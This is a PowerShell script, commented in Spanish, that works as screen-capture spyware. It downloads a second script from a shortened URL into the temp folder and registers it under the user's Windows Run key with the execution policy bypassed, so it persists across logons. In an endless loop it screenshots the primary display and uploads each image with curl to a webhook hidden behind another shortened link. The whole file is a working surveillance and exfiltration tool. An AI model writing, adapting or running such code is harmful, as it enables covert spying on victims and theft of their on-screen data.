$hookurl = "https://bit.ly/chu_kbras"
$seconds = 30 # Intervalo entre capturas
$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script

# Detección de URL acortada
if ($hookurl.Length -ne 121) {
    Write-Host "Shortened Webhook URL Detected..."
    $hookurl = (irm $hookurl).url
}

# Ruta de la carpeta temporal del usuario
$tempFolderPath = [System.IO.Path]::GetTempPath()
$scriptPath = Join-Path -Path $tempFolderPath -ChildPath "sysw.ps1"
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$registryName = "MiScript"
$registryValue = "`"powershell.exe -ExecutionPolicy Bypass -File '$scriptPath'`""

# Descargar el script principal en la carpeta temporal del usuario
Invoke-WebRequest -Uri "https://bit.ly/Screen_dc" -OutFile $scriptPath

# Agregar la entrada al Registro de Windows
New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String -Force

Write-Host "Se ha agregado una entrada al Registro para ejecutar el script al iniciar sesión del usuario."

do {
    $Filett = "$env:temp\SC.png"
    # Verificar si el archivo ya existe antes de crear uno nuevo
    if (-not (Test-Path $Filett)) {
        Add-Type -AssemblyName System.Windows.Forms
        Add-type -AssemblyName System.Drawing
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    }
    Start-Sleep 1
    
    # Verificar si la variable $hookurl está definida antes de utilizarla
    if (-not $hookurl) {
        Write-Host "La variable hookurl no está definida."
        exit
    }

    # Verificar si la variable $Filett está definida antes de utilizarla
    if (-not $Filett) {
        Write-Host "La variable Filett no está definida."
        exit
    }

    curl.exe -F "file1=@$Filett" $hookurl
    Start-Sleep 1
    Remove-Item -Path $Filett
    Start-Sleep $seconds

    # Verificar si se ha alcanzado la cantidad máxima de imágenes
    if ($a -eq $maxImages) {
        # Reiniciar contador de imágenes
        $a = 0
    }
} while ($true)